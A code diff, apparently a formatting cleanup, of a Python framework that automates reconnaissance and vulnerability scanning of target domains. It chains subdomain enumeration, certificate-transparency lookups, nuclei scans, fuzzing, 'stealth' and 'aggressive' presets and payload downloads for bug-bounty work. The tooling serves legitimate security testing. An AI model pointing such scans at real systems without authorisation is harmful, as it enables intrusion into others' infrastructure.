-                with open(args.config, 'r') as f:
+                with open(args.config, "r") as f:
                     custom_cfg = json.load(f)
                 cfg.update(custom_cfg)
             except Exception as e:
@@ -9107,21 +11184,21 @@ def handle_cli_execution(args):
 
         # Apply CLI arguments to configuration
         if args.threads > 0:
-            cfg['threads'] = args.threads
+            cfg["threads"] = args.threads
         if args.timeout:
-            cfg['timeout'] = args.timeout
+            cfg["timeout"] = args.timeout
         if args.rate_limit:
-            cfg['rate_limit'] = args.rate_limit
+            cfg["rate_limit"] = args.rate_limit
         if args.depth:
-            cfg['scan_depth'] = args.depth
+            cfg["scan_depth"] = args.depth
         if args.wordlist:
-            cfg['custom_wordlist'] = args.wordlist
+            cfg["custom_wordlist"] = args.wordlist
         if args.payloads:
-            cfg['custom_payloads'] = args.payloads
+            cfg["custom_payloads"] = args.payloads
         if args.user_agent:
-            cfg['user_agent'] = args.user_agent
+            cfg["user_agent"] = args.user_agent
         if args.proxy:
-            cfg['proxy'] = args.proxy
+            cfg["proxy"] = args.proxy
 
         # Initialize run
         scan_name = "cli_batch_scan" if args.batch else "cli_scan"
@@ -9130,8 +11207,8 @@ def handle_cli_execution(args):
         # Store targets
         rd.targets = validated_targets
         targets_file = rd.run_dir / "targets.txt"
-        with open(targets_file, 'w') as f:
-            f.write('\n'.join(validated_targets))
+        with open(targets_file, "w") as f:
+            f.write("\n".join(validated_targets))
 
         results = {}
 
@@ -9175,6 +11252,7 @@ def handle_cli_execution(args):
         logger.log(f"CLI execution failed: {e}", "ERROR")
         return 1
 
+
 # ---------- Main ----------
 def main():
     # Setup argument parser
@@ -9182,7 +11260,7 @@ def main():
 
     # If no arguments provided, run interactive mode
     if len(sys.argv) == 1:
-        sys.argv.append('--interactive')
+        sys.argv.append("--interactive")
 
     # Parse arguments
     try:
@@ -9199,12 +11277,17 @@ def main():
     if not args.interactive:
         print(BANNER)
         print(f"\033[91m{APP} v{VERSION}-ENHANCED\033[0m by {AUTHOR}")
-        print("\033[93m[SECURITY] Advanced Security Testing Framework - CLI Mode\033[0m")
+        print(
+            "\033[93m[SECURITY] Advanced Security Testing Framework - CLI Mode\033[0m"
+        )
 
     # Validate dependencies and environment
     if not validate_dependencies():
         if not args.quiet:
-            logger.log("[WARNING] Some dependencies missing. Please run install.sh or install manually.", "WARNING")
+            logger.log(
+                "[WARNING] Some dependencies missing. Please run install.sh or install manually.",
+                "WARNING",
+            )
             logger.log("Continuing with available functionality...", "WARNING")
             time.sleep(1)
 
@@ -9213,11 +11296,17 @@ def main():
 
     if not check_and_setup_environment():
         if not args.quiet:
-            logger.log("Environment setup issues detected. Some features may not work correctly.", "WARNING")
+            logger.log(
+                "Environment setup issues detected. Some features may not work correctly.",
+                "WARNING",
+            )
 
     # Resolve conflicting flags to avoid interactive hangs in CI/tests
-    if getattr(args, 'interactive', False) and getattr(args, 'batch', False):
-        logger.log("Conflicting options: --interactive and --batch supplied; proceeding in non-interactive batch mode", "WARNING")
+    if getattr(args, "interactive", False) and getattr(args, "batch", False):
+        logger.log(
+            "Conflicting options: --interactive and --batch supplied; proceeding in non-interactive batch mode",
+            "WARNING",
+        )
         args.interactive = False
 
     # Handle CLI execution or interactive mode
@@ -9225,7 +11314,9 @@ def main():
         # Original interactive menu system
         print(BANNER)
         print(f"\033[91m{APP} v{VERSION}-ENHANCED\033[0m by {AUTHOR}")
-        print("\033[93m[SECURITY] Advanced Security Testing Framework with Enhanced Capabilities\033[0m")
+        print(
+            "\033[93m[SECURITY] Advanced Security Testing Framework with Enhanced Capabilities\033[0m"
+        )
 
         while True:
             display_menu()
@@ -9311,50 +11402,61 @@ def main():
         # CLI mode execution
         return handle_cli_execution(args)
 
-def run_preset_scan_cli(preset: str, rd, env: Dict[str, str], cfg: Dict[str, Any]) -> Dict[str, Any]:
+
+def run_preset_scan_cli(
+    preset: str, rd, env: Dict[str, str], cfg: Dict[str, Any]
+) -> Dict[str, Any]:
     """Run preset scan in CLI mode"""
     logger.log(f"Running {preset} preset scan...", "INFO")
     results = {"preset": preset, "scans": {}}
 
     preset_configs = {
-        'fast': {'scan_depth': 1, 'timeout': 300, 'tools': ['subfinder', 'httpx', 'nuclei']},
-        'deep': {'scan_depth': 4, 'timeout': 1800, 'tools': ['all']},
-        'stealth': {'scan_depth': 2, 'timeout': 900, 'rate_limit': 5},
-        'aggressive': {'scan_depth': 5, 'timeout': 3600, 'rate_limit': 100}
+        "fast": {
+            "scan_depth": 1,
+            "timeout": 300,
+            "tools": ["subfinder", "httpx", "nuclei"],
+        },
+        "deep": {"scan_depth": 4, "timeout": 1800, "tools": ["all"]},
+        "stealth": {"scan_depth": 2, "timeout": 900, "rate_limit": 5},
+        "aggressive": {"scan_depth": 5, "timeout": 3600, "rate_limit": 100},
     }
 
     # Apply preset configuration
-    preset_cfg = preset_configs.get(preset, preset_configs['fast'])
+    preset_cfg = preset_configs.get(preset, preset_configs["fast"])
     cfg.update(preset_cfg)
 
     # Run reconnaissance
-    if preset in ['fast', 'deep', 'aggressive']:
-        results['scans']['recon'] = run_recon_cli(rd, env, cfg)
+    if preset in ["fast", "deep", "aggressive"]:
+        results["scans"]["recon"] = run_recon_cli(rd, env, cfg)
 
     # Run vulnerability scan
-    if preset in ['deep', 'aggressive']:
-        results['scans']['vuln'] = run_vuln_cli(rd, env, cfg)
+    if preset in ["deep", "aggressive"]:
+        results["scans"]["vuln"] = run_vuln_cli(rd, env, cfg)
 
     return results
 
-def run_full_pipeline_cli(rd, env: Dict[str, str], cfg: Dict[str, Any]) -> Dict[str, Any]:
+
+def run_full_pipeline_cli(
+    rd, env: Dict[str, str], cfg: Dict[str, Any]
+) -> Dict[str, Any]:
     """Run full pipeline in CLI mode"""
     logger.log("Running full pipeline (recon + vuln + report)...", "INFO")
     results = {"pipeline": "full", "scans": {}}
 
     # Run reconnaissance
-    results['scans']['recon'] = run_recon_cli(rd, env, cfg)
+    results["scans"]["recon"] = run_recon_cli(rd, env, cfg)
 
     # Run vulnerability assessment
-    results['scans']['vuln'] = run_vuln_cli(rd, env, cfg)
+    results["scans"]["vuln"] = run_vuln_cli(rd, env, cfg)
 
     # Generate report
     report_file = rd.run_dir / "full_pipeline_report.json"
-    with open(report_file, 'w') as f:
+    with open(report_file, "w") as f:
         json.dump(results, f, indent=2, default=str)
 
-    results['report_file'] = str(report_file)
+    results["report_file"] = str(report_file)
     return results
+
 
 def run_recon_cli(rd, env: Dict[str, str], cfg: Dict[str, Any]) -> Dict[str, Any]:
     """Run reconnaissance in CLI mode"""
@@ -9370,36 +11472,41 @@ def run_recon_cli(rd, env: Dict[str, str], cfg: Dict[str, Any]) -> Dict[str, Any
             subdomain_file = rd.run_dir / f"{target}_subdomains.txt"
             run_subfinder(target, subdomain_file, env)
             if subdomain_file.exists():
-                with open(subdomain_file, 'r') as f:
-                    target_results['subdomains'] = [line.strip() for line in f if line.strip()]
+                with open(subdomain_file, "r") as f:
+                    target_results["subdomains"] = [
+                        line.strip() for line in f if line.strip()
+                    ]
 
         # HTTP probe
-        if target_results.get('subdomains'):
+        if target_results.get("subdomains"):
             all_targets_file = rd.run_dir / f"{target}_all_targets.txt"
-            with open(all_targets_file, 'w') as f:
+            with open(all_targets_file, "w") as f:
                 f.write(f"{target}\n")
-                f.write('\n'.join(target_results['subdomains']))
+                f.write("\n".join(target_results["subdomains"]))
 
             http_file = rd.run_dir / f"{target}_http_results.json"
-            run_httpx(all_targets_file, http_file, env, cfg.get('timeout', 10))
+            run_httpx(all_targets_file, http_file, env, cfg.get("timeout", 10))
             if http_file.exists():
                 try:
-                    with open(http_file, 'r') as f:
-                        target_results['http_services'] = [json.loads(line) for line in f if line.strip()]
+                    with open(http_file, "r") as f:
+                        target_results["http_services"] = [
+                            json.loads(line) for line in f if line.strip()
+                        ]
                 except json.JSONDecodeError:
                     pass
 
         # Technology detection
-        if target_results.get('http_services'):
-            for service in target_results['http_services'][:5]:  # Limit to first 5
-                url = service.get('url', '')
+        if target_results.get("http_services"):
+            for service in target_results["http_services"][:5]:  # Limit to first 5
+                url = service.get("url", "")
                 if url:
                     tech_file = rd.run_dir / f"{target}_tech_{hash(url) % 1000}.json"
                     run_whatweb(url, tech_file, env)
 
-        results['findings'][target] = target_results
+        results["findings"][target] = target_results
 
     return results
+
 
 def run_vuln_cli(rd, env: Dict[str, str], cfg: Dict[str, Any]) -> Dict[str, Any]:
     """Run vulnerability assessment in CLI mode"""
@@ -9415,12 +11522,12 @@ def run_vuln_cli(rd, env: Dict[str, str], cfg: Dict[str, Any]) -> Dict[str, Any]
         urls = []
         if http_file.exists():
             try:
-                with open(http_file, 'r') as f:
+                with open(http_file, "r") as f:
                     for line in f:
                         if line.strip():
                             service = json.loads(line)
-                            if service.get('url'):
-                                urls.append(service['url'])
+                            if service.get("url"):
+                                urls.append(service["url"])
             except json.JSONDecodeError:
                 urls = [f"http://{target}"]
         else:
@@ -9430,14 +11537,26 @@ def run_vuln_cli(rd, env: Dict[str, str], cfg: Dict[str, Any]) -> Dict[str, Any]
         if which("nuclei") and urls:
             for url in urls[:3]:  # Limit to first 3 URLs
                 nuclei_file = rd.run_dir / f"{target}_nuclei_{hash(url) % 1000}.json"
-                run_cmd([
-                    "nuclei", "-u", url, "-severity", "low,medium,high,critical",
-                    "-jsonl", "-silent", "-o", str(nuclei_file)
-                ], env=env, timeout=300, check_return=False)
+                run_cmd(
+                    [
+                        "nuclei",
+                        "-u",
+                        url,
+                        "-severity",
+                        "low,medium,high,critical",
+                        "-jsonl",
+                        "-silent",
+                        "-o",
+                        str(nuclei_file),
+                    ],
+                    env=env,
+                    timeout=300,
+                    check_return=False,
+                )
 
                 if nuclei_file.exists():
                     try:
-                        with open(nuclei_file, 'r') as f:
+                        with open(nuclei_file, "r") as f:
                             vulns = []
                             for line in f:
                                 if line.strip():
@@ -9455,49 +11574,51 @@ def run_vuln_cli(rd, env: Dict[str, str], cfg: Dict[str, Any]) -> Dict[str, Any]
                 if common_wordlist.exists():
                     run_ffuf(url, common_wordlist, fuzz_file, env)
 
-        results['vulnerabilities'][target] = target_vulns
+        results["vulnerabilities"][target] = target_vulns
 
     return results
+
 
 def save_results_to_file(results: Dict[str, Any], filename: str, format_type: str):
     """Save scan results to file in specified format"""
     output_path = Path(filename)
 
     try:
-        if format_type == 'json':
-            with open(output_path, 'w') as f:
+        if format_type == "json":
+            with open(output_path, "w") as f:
                 json.dump(results, f, indent=2, default=str)
-        elif format_type == 'xml':
+        elif format_type == "xml":
             # Simple XML conversion
-            xml_content = dict_to_xml(results, 'scan_results')
-            with open(output_path, 'w') as f:
+            xml_content = dict_to_xml(results, "scan_results")
+            with open(output_path, "w") as f:
                 f.write(xml_content)
-        elif format_type == 'html':
+        elif format_type == "html":
             html_content = generate_html_report(results)
-            with open(output_path, 'w') as f:
+            with open(output_path, "w") as f:
                 f.write(html_content)
         else:  # txt format
             txt_content = dict_to_text(results)
-            with open(output_path, 'w') as f:
+            with open(output_path, "w") as f:
                 f.write(txt_content)
 
         logger.log(f"Results saved to: {output_path}", "SUCCESS")
     except Exception as e:
         logger.log(f"Failed to save results: {e}", "ERROR")
 
+
 def display_results(results: Dict[str, Any], format_type: str, quiet: bool = False):
     """Display scan results in specified format"""
     if quiet:
         return
 
-    if format_type == 'json':
+    if format_type == "json":
         print(json.dumps(results, indent=2, default=str))
     else:
         print(dict_to_text(results))
 
+
 def dict_to_xml(data: Dict[str, Any], root_name: str = "data") -> str:
     """Convert dictionary to XML format"""
-
 
     def dict_to_xml_recursive(d, name):
         if isinstance(d, dict):
@@ -9514,6 +11635,7 @@ def dict_to_xml(data: Dict[str, Any], root_name: str = "data") -> str:
             return f"<{name}>{str(d)}</{name}>"
 
     return f'<?xml version="1.0" encoding="UTF-8"?>\n{dict_to_xml_recursive(data, root_name)}'
+
 
 def dict_to_text(data: Dict[str, Any], indent: int = 0) -> str:
     """Convert dictionary to readable text format"""
@@ -9532,6 +11654,7 @@ def dict_to_text(data: Dict[str, Any], indent: int = 0) -> str:
         text += f"{prefix}{str(data)}\n"
 
     return text
+
 
 def generate_html_report(results: Dict[str, Any]) -> str:
     """Generate HTML report from results"""
@@ -9562,6 +11685,7 @@ def generate_html_report(results: Dict[str, Any]) -> str:
 
     return html
 
+
 def launch_advanced_tui():
     """Launch the advanced Terminal User Interface"""
     try:
@@ -9573,15 +11697,21 @@ def launch_advanced_tui():
         if tui_script.exists():
             subprocess.run([sys.executable, str(tui_script, timeout=300)])
         else:
-            logger.log("TUI launcher not found. Using fallback import method.", "WARNING")
+            logger.log(
+                "TUI launcher not found. Using fallback import method.", "WARNING"
+            )
 
             # Try direct import
             try:
                 from tui.app import PantheonTUI
+
                 app = PantheonTUI()
                 app.run()
             except ImportError:
-                logger.log("TUI dependencies missing. Install with: pip install textual", "ERROR")
+                logger.log(
+                    "TUI dependencies missing. Install with: pip install textual",
+                    "ERROR",
+                )
             except Exception as e:
                 logger.log(f"TUI launch failed: {e}", "ERROR")
 
@@ -9590,10 +11720,15 @@ def launch_advanced_tui():
 
     input("Press Enter to continue...")
 
+
 def view_last_report():
     """View the last generated report"""
     try:
-        runs = sorted([d for d in RUNS_DIR.iterdir() if d.is_dir()], key=lambda p: p.stat().st_mtime, reverse=True)
+        runs = sorted(
+            [d for d in RUNS_DIR.iterdir() if d.is_dir()],
+            key=lambda p: p.stat().st_mtime,
+            reverse=True,
+        )
         if not runs:
             logger.log("No reports found", "WARNING")
             return
@@ -9613,6 +11748,7 @@ def view_last_report():
 
     except Exception as e:
         logger.log(f"Error viewing report: {e}", "ERROR")
+
 
 def enhanced_payload_management_menu():
     """Enhanced payload management menu"""
@@ -9649,9 +11785,14 @@ def enhanced_payload_management_menu():
             logger.log("✅ Enhanced wordlists created", "SUCCESS")
 
         elif choice == "4":
-            force_update = input("Force update existing files? (yes/no): ").strip().lower() == "yes"
+            force_update = (
+                input("Force update existing files? (yes/no): ").strip().lower()
+                == "yes"
+            )
             logger.log("Downloading payload sources...", "INFO")
-            if EnhancedPayloadManager.download_payload_sources(force_update=force_update):
+            if EnhancedPayloadManager.download_payload_sources(
+                force_update=force_update
+            ):
                 logger.log("✅ Payload sources downloaded", "SUCCESS")
             else:
                 logger.log("⚠️ Some payload downloads may have failed", "WARNING")
@@ -9675,6 +11816,7 @@ def enhanced_payload_management_menu():
         logger.log(f"Payload management error: {e}", "ERROR")
 
     input("Press Enter to continue...")
+
 
 def tool_status_management_menu():
     """Tool status and fallback management menu"""
@@ -9719,6 +11861,7 @@ def tool_status_management_menu():
 
     input("Press Enter to continue...")
 
+
 def show_comprehensive_tool_status():
     """Show comprehensive tool status"""
     print("\n\033[92m🔧 Comprehensive Tool Status:\033[0m")
@@ -9735,7 +11878,7 @@ def show_comprehensive_tool_status():
         "Exploitation": ["sqlmap", "dalfox", "xsstrike"],
         "Parameter Discovery": ["arjun", "paramspider"],
         "Subdomain Takeover": ["subjack", "subzy"],
-        "DNS Tools": ["dig", "nslookup", "host"]
+        "DNS Tools": ["dig", "nslookup", "host"],
     }
 
     for category, tools in categories.items():
@@ -9749,6 +11892,7 @@ def show_comprehensive_tool_status():
                 print(f"    {available} {tool} {installable}")
                 if alt_count > 0:
                     print(f"      └─ {alt_count} alternatives available")
+
 
 def test_tool_availability():
     """Test tool availability with fallbacks"""
@@ -9766,13 +11910,17 @@ def test_tool_availability():
         else:
             print(f"  ❌ {tool} - No alternatives available")
 
+
 def install_missing_tools_menu():
     """Menu for installing missing tools"""
     print("\n\033[93m🔧 Install Missing Tools:\033[0m")
 
     status = EnhancedToolFallbackManager.get_tool_status()
-    missing_tools = [tool for tool, info in status.items()
-                    if not info["available"] and info["installable"]]
+    missing_tools = [
+        tool
+        for tool, info in status.items()
+        if not info["available"] and info["installable"]
+    ]
 
     if not missing_tools:
         logger.log("No missing installable tools found", "INFO")
@@ -9786,7 +11934,9 @@ def install_missing_tools_menu():
     print(f"  {len(missing_tools) + 2}. Back")
 
     try:
-        choice = input(f"\nSelect tool to install (1-{len(missing_tools) + 2}): ").strip()
+        choice = input(
+            f"\nSelect tool to install (1-{len(missing_tools) + 2}): "
+        ).strip()
 
         if choice.isdigit():
             choice_num = int(choice)
@@ -9804,16 +11954,22 @@ def install_missing_tools_menu():
                 for tool in missing_tools:
                     if EnhancedToolFallbackManager.install_tool(tool):
                         success_count += 1
-                logger.log(f"✅ Installed {success_count}/{len(missing_tools)} tools", "INFO")
+                logger.log(
+                    f"✅ Installed {success_count}/{len(missing_tools)} tools", "INFO"
+                )
 
     except ValueError:
         logger.log("Invalid selection", "ERROR")
+
 
 def show_tool_alternatives():
     """Show available alternatives for each tool"""
     print("\n\033[92m🔄 Tool Alternatives:\033[0m")
 
-    for primary_tool, alternatives in EnhancedToolFallbackManager.TOOL_ALTERNATIVES.items():
+    for (
+        primary_tool,
+        alternatives,
+    ) in EnhancedToolFallbackManager.TOOL_ALTERNATIVES.items():
         available_alts = [alt for alt in alternatives if which(alt)]
         status = "✅" if which(primary_tool) else "❌"
 
@@ -9825,14 +11981,22 @@ def show_tool_alternatives():
         else:
             print("    └─ No alternatives configured")
 
+
 def validate_all_dependencies_comprehensive():
     """Comprehensive dependency validation"""
     print("\n\033[93m🔍 Comprehensive Dependency Validation...\033[0m")
 
     # Check core Python modules
     python_modules = [
-        "requests", "json", "subprocess", "pathlib", "threading",
-        "concurrent.futures", "tempfile", "shutil", "uuid"
+        "requests",
+        "json",
+        "subprocess",
+        "pathlib",
+        "threading",
+        "concurrent.futures",
+        "tempfile",
+        "shutil",
+        "uuid",
     ]
 
     print("\n\033[96mPython Modules:\033[0m")
@@ -9849,7 +12013,15 @@ def validate_all_dependencies_comprehensive():
 
     # Check directory structure
     print("\n\033[96mDirectory Structure:\033[0m")
-    required_dirs = [RUNS_DIR, LOG_DIR, EXT_DIR, EXTRA_DIR, MERGED_DIR, PAYLOADS_DIR, PLUGINS_DIR]
+    required_dirs = [
+        RUNS_DIR,
+        LOG_DIR,
+        EXT_DIR,
+        EXTRA_DIR,
+        MERGED_DIR,
+        PAYLOADS_DIR,
+        PLUGINS_DIR,
+    ]
     for dir_path in required_dirs:
         if dir_path.exists():
             print(f"  ✅ {dir_path.name}")
@@ -9857,6 +12029,7 @@ def validate_all_dependencies_comprehensive():
             print(f"  ❌ {dir_path.name}")
             dir_path.mkdir(exist_ok=True)
             print(f"    └─ Created {dir_path.name}")
+
 
 def create_tool_status_report():
     """Create a comprehensive tool status report"""
@@ -9867,25 +12040,26 @@ def create_tool_status_report():
 
     # Add system information
     import platform
+
     report_data = {
         "timestamp": datetime.now().isoformat(),
         "system_info": {
             "platform": platform.system(),
             "version": platform.version(),
             "architecture": platform.architecture()[0],
-            "python_version": platform.python_version()
+            "python_version": platform.python_version(),
         },
         "tool_status": status,
         "summary": {
             "total_tools": len(status),
             "available_tools": len([t for t in status.values() if t["available"]]),
             "missing_tools": len([t for t in status.values() if not t["available"]]),
-            "installable_tools": len([t for t in status.values() if t["installable"]])
-        }
+            "installable_tools": len([t for t in status.values() if t["installable"]]),
+        },
     }
 
     try:
-        with open(report_file, 'w') as f:
+        with open(report_file, "w") as f:
             json.dump(report_data, f, indent=2)
 
         logger.log(f"✅ Tool status report saved to: {report_file}", "SUCCESS")
@@ -9901,11 +12075,14 @@ def create_tool_status_report():
     except Exception as e:
         logger.log(f"Failed to create tool status report: {e}", "ERROR")
 
+
 # ---------- BCAR Integration Functions ----------
 def run_bcar_enhanced_reconnaissance(rd, env, cfg):
     """Run BCAR enhanced reconnaissance module"""
     if not BCAR_AVAILABLE:
-        logger.log("BCAR module not available. Please check bcar.py installation.", "WARNING")
+        logger.log(
+            "BCAR module not available. Please check bcar.py installation.", "WARNING"
+        )
         return
 
     logger.log("Starting BCAR Enhanced Reconnaissance...", "INFO")
@@ -9916,12 +12093,12 @@ def run_bcar_enhanced_reconnaissance(rd, env, cfg):
 
         # Get targets from run data
         targets = []
-        if hasattr(rd, 'targets_list') and rd.targets_list:
+        if hasattr(rd, "targets_list") and rd.targets_list:
             targets = rd.targets_list
         else:
             # Fallback to reading from targets file
             if TARGETS.exists():
-                with open(TARGETS, 'r') as f:
+                with open(TARGETS, "r") as f:
                     targets = [line.strip() for line in f if line.strip()]
 
         if not targets:
@@ -9929,23 +12106,28 @@ def run_bcar_enhanced_reconnaissance(rd, env, cfg):
             return
 
         # Configure BCAR scan
-        bcar_config = cfg.get('bcar', {
-            'ct_search': True,
-            'subdomain_enum': True,
-            'takeover_check': True,
-            'port_scan': True,
-            'tech_detection': True,
-            'directory_fuzz': True,
-            'parameter_discovery': True
-        })
+        bcar_config = cfg.get(
+            "bcar",
+            {
+                "ct_search": True,
+                "subdomain_enum": True,
+                "takeover_check": True,
+                "port_scan": True,
+                "tech_detection": True,
+                "directory_fuzz": True,
+                "parameter_discovery": True,
+            },
+        )
 
         # Run BCAR scan
         logger.log(f"Running BCAR scan on {len(targets)} targets...", "INFO")
-        bcar_results = bcar_integration.integrate_with_pantheon_scan(targets, bcar_config)
+        bcar_results = bcar_integration.integrate_with_pantheon_scan(
+            targets, bcar_config
+        )
 
         # Save results
         bcar_output_file = rd.run_dir / "bcar_enhanced_results.json"
-        with open(bcar_output_file, 'w') as f:
+        with open(bcar_output_file, "w") as f:
             json.dump(bcar_results, f, indent=2)
 
         logger.log(f"BCAR results saved to: {bcar_output_file}", "SUCCESS")
@@ -9953,18 +12135,25 @@ def run_bcar_enhanced_reconnaissance(rd, env, cfg):
         # Log summary
         total_subdomains = 0
         total_vulnerabilities = 0
-        for domain, results in bcar_results['bcar_results'].items():
-            total_subdomains += len(results.get('subdomains', []))
-            total_vulnerabilities += len(results.get('takeover_vulnerabilities', []))
+        for domain, results in bcar_results["bcar_results"].items():
+            total_subdomains += len(results.get("subdomains", []))
+            total_vulnerabilities += len(results.get("takeover_vulnerabilities", []))
 
-        logger.log(f"BCAR Summary: {total_subdomains} subdomains, {total_vulnerabilities} takeover vulnerabilities found", "INFO")
+        logger.log(
+            f"BCAR Summary: {total_subdomains} subdomains, {total_vulnerabilities} takeover vulnerabilities found",
+            "INFO",
+        )
 
     except Exception as e:
         logger.log(f"BCAR reconnaissance failed: {e}", "ERROR")
 
+
 # ---------- Enhanced Bug Bounty Integration Functions ----------
 
-def run_enhanced_bug_bounty_automation(rd: Path, env: Dict[str, str], cfg: Dict[str, Any]):
+
+def run_enhanced_bug_bounty_automation(
+    rd: Path, env: Dict[str, str], cfg: Dict[str, Any]
+):
     """Enhanced bug bounty automation with integrated functionality from bug_bounty_commands.sh"""
     logger.log("Starting Enhanced Bug Bounty Automation...", "INFO")
 
@@ -9972,8 +12161,12 @@ def run_enhanced_bug_bounty_automation(rd: Path, env: Dict[str, str], cfg: Dict[
         # Get targets
         targets = []
         if TARGETS.exists():
-            with open(TARGETS, 'r') as f:
-                targets = [line.strip() for line in f if line.strip() and validate_domain_input(line.strip())]
+            with open(TARGETS, "r") as f:
+                targets = [
+                    line.strip()
+                    for line in f
+                    if line.strip() and validate_domain_input(line.strip())
+                ]
 
         if not targets:
             logger.log("No valid targets found for bug bounty automation", "ERROR")
@@ -9988,27 +12181,37 @@ def run_enhanced_bug_bounty_automation(rd: Path, env: Dict[str, str], cfg: Dict[
             "total_subdomains": 0,
             "total_vulnerabilities": 0,
             "tools_used": [],
-            "results": {}
+            "results": {},
         }
 
         for target in targets:
             logger.log(f"Processing target: {target}", "INFO")
             target_results = run_comprehensive_bug_bounty_scan(target, results_dir, cfg)
             bug_bounty_summary["results"][target] = target_results
-            bug_bounty_summary["total_subdomains"] += target_results.get("subdomains_found", 0)
-            bug_bounty_summary["total_vulnerabilities"] += target_results.get("vulnerabilities_found", 0)
+            bug_bounty_summary["total_subdomains"] += target_results.get(
+                "subdomains_found", 0
+            )
+            bug_bounty_summary["total_vulnerabilities"] += target_results.get(
+                "vulnerabilities_found", 0
+            )
 
         # Save comprehensive results
         summary_file = results_dir / "bug_bounty_summary.json"
-        with open(summary_file, 'w') as f:
+        with open(summary_file, "w") as f:
             json.dump(bug_bounty_summary, f, indent=2)
 
-        logger.log(f"Bug bounty automation completed. Found {bug_bounty_summary['total_subdomains']} subdomains and {bug_bounty_summary['total_vulnerabilities']} potential vulnerabilities", "SUCCESS")
+        logger.log(
+            f"Bug bounty automation completed. Found {bug_bounty_summary['total_subdomains']} subdomains and {bug_bounty_summary['total_vulnerabilities']} potential vulnerabilities",
+            "SUCCESS",
+        )
 
     except Exception as e:
         logger.log(f"Bug bounty automation failed: {e}", "ERROR")
 
-def run_comprehensive_bug_bounty_scan(target: str, results_dir: Path, cfg: Dict[str, Any]) -> Dict[str, Any]:
+
+def run_comprehensive_bug_bounty_scan(
+    target: str, results_dir: Path, cfg: Dict[str, Any]
+) -> Dict[str, Any]:
     """Run comprehensive bug bounty scan for a single target"""
     target_dir = results_dir / target
     target_dir.mkdir(exist_ok=True)
@@ -10017,7 +12220,7 @@ def run_comprehensive_bug_bounty_scan(target: str, results_dir: Path, cfg: Dict[
         "target": target,
         "subdomains_found": 0,
         "vulnerabilities_found": 0,
-        "scan_phases": {}
+        "scan_phases": {},
     }
 
     # Phase 1: Enhanced Subdomain Enumeration
@@ -10029,7 +12232,9 @@ def run_comprehensive_bug_bounty_scan(target: str, results_dir: Path, cfg: Dict[
     # Phase 2: Port Scanning and Service Detection
     if subdomain_results.get("subdomains"):
         logger.log("Phase 2: Port scanning and service detection", "INFO")
-        port_results = run_enhanced_port_scanning(subdomain_results["subdomains"], target_dir, cfg)
+        port_results = run_enhanced_port_scanning(
+            subdomain_results["subdomains"], target_dir, cfg
+        )
         scan_results["scan_phases"]["port_scanning"] = port_results
 
     # Phase 3: Web Application Discovery
@@ -10045,28 +12250,37 @@ def run_comprehensive_bug_bounty_scan(target: str, results_dir: Path, cfg: Dict[
 
     return scan_results
 
-def run_enhanced_subdomain_enumeration(target: str, target_dir: Path, cfg: Dict[str, Any]) -> Dict[str, Any]:
+
+def run_enhanced_subdomain_enumeration(
+    target: str, target_dir: Path, cfg: Dict[str, Any]
+) -> Dict[str, Any]:
     """Enhanced subdomain enumeration using multiple tools and techniques"""
-    subdomain_results = {
-        "subdomains": set(),
-        "tools_used": [],
-        "errors": []
-    }
+    subdomain_results = {"subdomains": set(), "tools_used": [], "errors": []}
 
     # Tool configurations with fallbacks
     tools_config = [
-        {"name": "subfinder", "cmd": ["subfinder", "-d", target, "-all", "-silent"], "timeout": 300},
-        {"name": "assetfinder", "cmd": ["assetfinder", "--subs-only", target], "timeout": 180},
+        {
+            "name": "subfinder",
+            "cmd": ["subfinder", "-d", target, "-all", "-silent"],
+            "timeout": 300,
+        },
+        {
+            "name": "assetfinder",
+            "cmd": ["assetfinder", "--subs-only", target],
+            "timeout": 180,
+        },
         {"name": "findomain", "cmd": ["findomain", "-t", target, "-q"], "timeout": 240},
     ]
 
     # Use amass if available (longer timeout due to comprehensiveness)
     if which("amass"):
-        tools_config.append({
-            "name": "amass",
-            "cmd": ["amass", "enum", "-passive", "-d", target],
-            "timeout": 600
-        })
+        tools_config.append(
+            {
+                "name": "amass",
+                "cmd": ["amass", "enum", "-passive", "-d", target],
+                "timeout": 600,
+            }
+        )
 
     for tool_config in tools_config:
         tool_name = tool_config["name"]
@@ -10077,14 +12291,20 @@ def run_enhanced_subdomain_enumeration(target: str, target_dir: Path, cfg: Dict[
                     tool_config["cmd"],
                     timeout=tool_config["timeout"],
                     capture=True,
-                    check_return=False
+                    check_return=False,
                 )
 
                 if result and result.stdout:
-                    new_subdomains = set(line.strip() for line in result.stdout.splitlines() if line.strip())
+                    new_subdomains = set(
+                        line.strip()
+                        for line in result.stdout.splitlines()
+                        if line.strip()
+                    )
                     subdomain_results["subdomains"].update(new_subdomains)
                     subdomain_results["tools_used"].append(tool_name)
-                    logger.log(f"{tool_name} found {len(new_subdomains)} subdomains", "DEBUG")
+                    logger.log(
+                        f"{tool_name} found {len(new_subdomains)} subdomains", "DEBUG"
+                    )
 
             except Exception as e:
                 error_msg = f"{tool_name} failed: {str(e)}"
@@ -10097,7 +12317,10 @@ def run_enhanced_subdomain_enumeration(target: str, target_dir: Path, cfg: Dict[
         if ct_subdomains:
             subdomain_results["subdomains"].update(ct_subdomains)
             subdomain_results["tools_used"].append("certificate_transparency")
-            logger.log(f"Certificate transparency found {len(ct_subdomains)} subdomains", "DEBUG")
+            logger.log(
+                f"Certificate transparency found {len(ct_subdomains)} subdomains",
+                "DEBUG",
+            )
     except Exception as e:
         subdomain_results["errors"].append(f"Certificate transparency failed: {str(e)}")
 
@@ -10106,16 +12329,18 @@ def run_enhanced_subdomain_enumeration(target: str, target_dir: Path, cfg: Dict[
 
     # Save subdomains to file
     subdomain_file = target_dir / f"{target}_subdomains.txt"
-    with open(subdomain_file, 'w') as f:
-        f.write('\n'.join(subdomain_results["subdomains"]))
+    with open(subdomain_file, "w") as f:
+        f.write("\n".join(subdomain_results["subdomains"]))
 
     return subdomain_results
+
 
 def search_certificate_transparency(domain: str) -> List[str]:
     """Search Certificate Transparency logs for subdomains with performance optimization"""
     try:
         # Try to use optimized version if available
         from performance_optimizer import optimize_certificate_transparency_search
+
         result = optimize_certificate_transparency_search(f"%25.{domain}", limit=100)
         if result:
             return result
@@ -10128,22 +12353,21 @@ def search_certificate_transparency(domain: str) -> List[str]:
 
     subdomains = set()
 
-    ct_urls = [
-        f"https://crt.sh/?q=%25.{domain}&output=json"
-    ]
+    ct_urls = [f"https://crt.sh/?q=%25.{domain}&output=json"]
 
     for url in ct_urls:
         try:
             import requests
+
             response = requests.get(url, timeout=15)  # Increased timeout
             if response.status_code == 200:
                 data = response.json()
                 # Limit results for performance
                 for entry in data[:100]:  # Reduced from 1000 to 100
-                    name_value = entry.get('name_value', '')
